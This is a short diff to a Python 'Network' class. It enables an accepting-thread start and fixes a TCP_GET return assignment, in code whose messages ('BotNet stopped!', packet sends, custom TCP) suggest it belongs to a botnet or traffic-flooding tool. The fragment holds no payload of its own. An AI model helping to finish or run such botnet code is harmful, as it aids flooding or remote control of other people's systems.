@@ -201,8 +201,8 @@ class Network:
             self.StartParallels(action, array)
             # StartParallels_threading.join()  # True
             # print("Packets sends!")
-            # AcceptingAction_threading.start()
-            # AcceptingAction_threading.join()
+            AcceptingAction_threading.start()
+            AcceptingAction_threading.join()
         else:
             print("Custom TCP: ", self.large)
             StartParallels_threading.start()
@@ -313,7 +313,7 @@ class Network:
                     print("Command BE - BotNet stopped!")
                     exit(6)
                 case "S":
-                    self.TCP_GET(ip=self.server, port=self.reserved_port)
+                    array = self.TCP_GET(ip=self.server, port=self.reserved_port)
                     # array = self.WaitPackets(data["PKG"])
                     array = Sort.merge_sort(array)
                     print(len(array))
